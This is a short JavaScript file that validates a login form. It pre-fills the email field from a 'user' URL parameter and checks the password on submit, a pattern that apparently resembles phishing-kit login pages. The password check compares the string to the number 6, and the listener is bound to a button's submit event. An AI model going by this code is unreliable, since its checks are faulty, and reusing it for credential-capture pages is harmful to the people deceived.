const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/

//
const urlEmail = new URLSearchParams(window.location.search);
const usermail = urlEmail.get('user');

const form_btn = document.querySelector("#form_btn");
const input_mail = document.querySelector("#input_mail");
const input_pass = document.querySelector("#input_pass");

if (validEmail.test(usermail)) {
    input_mail.value = usermail
}

form_btn.addEventListener('submit', (e)=>{

    if (!validEmail.test(input_mail.value)) {
        e.preventDefault()
        alert("Please, enter your email address")
        return
    }

    if (input_pass.value == "") {
        e.preventDefault()
        alert("Password can't be empty")
        return
    }

    if (input_pass.value < 6) {
        e.preventDefault()
        alert("Wrong email password")
        return
    }
})
